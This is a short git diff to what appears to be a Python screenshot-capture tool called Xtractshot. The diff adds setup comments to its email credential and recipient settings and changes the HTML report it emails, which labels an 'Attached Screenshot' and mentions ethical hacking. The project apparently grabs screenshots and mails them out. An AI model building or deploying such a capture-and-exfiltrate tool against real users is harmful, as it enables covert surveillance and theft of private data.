@@ -11,10 +11,10 @@ from email import encoders
 from PIL import ImageGrab
 
 # Configuration
-email_address = " "
-password = " "
-toaddr = " "
-file_path = r" "
+email_address = " "  # Enter your email here
+password = " " # Enter your email password here
+toaddr = " "  # Enter the email address you want to send your information to
+file_path = r" " # Enter the file path you want your files to be saved to
 extend = "\\"
 file_merge = os.path.join(file_path, extend)
 screenshot_information = "screenshot.png"
@@ -61,7 +61,7 @@ def send_email(subject, body, attachment_path, toaddr):
           <p style="color: #0ef; font-size: 12px;">Make sure your usage complies with ethical hacking standards.</p>
           <hr style="border-color: #0ef; margin: 20px 0;">
           {'' if not attachment_path else f'<p style="color: #e0e0e0;"><b>Attached Screenshot:</b> {os.path.basename(attachment_path)}</p>'} <br> 
-          <a href="https://github.com/mubbashirulislam/Xtractshot.git" style="color: #0ef; text-decoration: none; border: 1px solid #0ef; padding: 10px 15px; border-radius: 5px;">Visit Xtractshot</a>
+          <a href="https://github.com/mubbashirulislam/Xtractshot.git" style="color: #0ef; text-decoration: none; border: 1px solid #0ef; padding: 10px 15px; border-radius: 5px;">Visit Xtractshot</a> <br>
         
         </div>
       </body>
